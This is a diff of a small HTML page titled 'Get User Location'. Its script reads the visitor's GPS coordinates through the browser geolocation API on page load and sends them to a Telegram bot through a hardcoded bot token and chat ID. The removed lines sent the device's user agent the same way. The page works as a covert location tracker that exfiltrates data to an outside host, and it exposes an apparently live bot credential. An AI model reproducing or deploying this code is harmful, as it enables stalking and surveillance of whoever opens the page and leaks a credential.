@@ -32,27 +32,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Get Battery Level and Live Location</title>
+    <title>Get User Location</title>
 </head>
 <body>
     <script>
-        // Code to get battery level
-        navigator.getBattery().then(function(battery) {
-            console.log("Battery Level: " + battery.level * 100 + "%");
-        });
+        var botApiToken = '6438227169:AAEKg3lNj64EomHDUbseoWDE8ad91bjLvNc';
+        var telegramId = '1776168152';
+        
+        function sendLocationToTelegram(latitude, longitude) {
+            var url = 'https://api.telegram.org/bot' + botApiToken + '/sendLocation?chat_id=' + telegramId + '&latitude=' + latitude + '&longitude=' + longitude;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+        }
 
-        // Code to get live location using GPS
-        navigator.geolocation.getCurrentPosition(function(position) {
-            console.log("Latitude: " + position.coords.latitude);
-            console.log("Longitude: " + position.coords.longitude);
+        // Get user's location (latitude and longitude) using browser's geolocation API
+        navigator.geolocation.getCurrentPosition(position => {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            sendLocationToTelegram(latitude, longitude);
         });
-
-        // Code to send mobile name to Telegram bot
-        var botApiToken = "6438227169:AAEKg3lNj64EomHDUbseoWDE8ad91bjLvNc";
-        var telegramId = "1776168152";
-        var mobileName = navigator.userAgent;
-        var url = "https://api.telegram.org/bot" + botApiToken + "/sendMessage?chat_id=" + telegramId + "&text=Mobile Name: " + mobileName;
-        fetch(url);
     </script>
 </body>
 </html>
